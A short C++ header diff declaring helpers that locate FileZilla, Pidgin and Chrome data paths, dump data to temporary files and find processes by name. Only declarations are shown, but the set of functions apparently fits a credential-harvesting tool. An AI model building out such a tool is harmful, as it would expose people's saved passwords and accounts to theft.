@@ -28,10 +28,12 @@
 #include <string>
 
 namespace libsystem {
-	HRESULT get_roaming_path(PWSTR* path);
+	HRESULT get_appdata_path(PWSTR* path);
+	HRESULT get_localappdata_path(PWSTR* path);
 	std::wstring get_filezilla_path(void);
 	std::wstring get_pidgin_path(void);
-	BOOL generate_temp_filename(LPWSTR filename);
+	BOOL generate_temp_filename(LPCWSTR prefix, LPWSTR filename);
 	BOOL dump_to_file(LPCWSTR filename, LPWSTR data);
 	DWORD GetProcessIdByProcessName(LPCWSTR pszProcessName);
+	std::wstring get_chrome_path(void);
 }
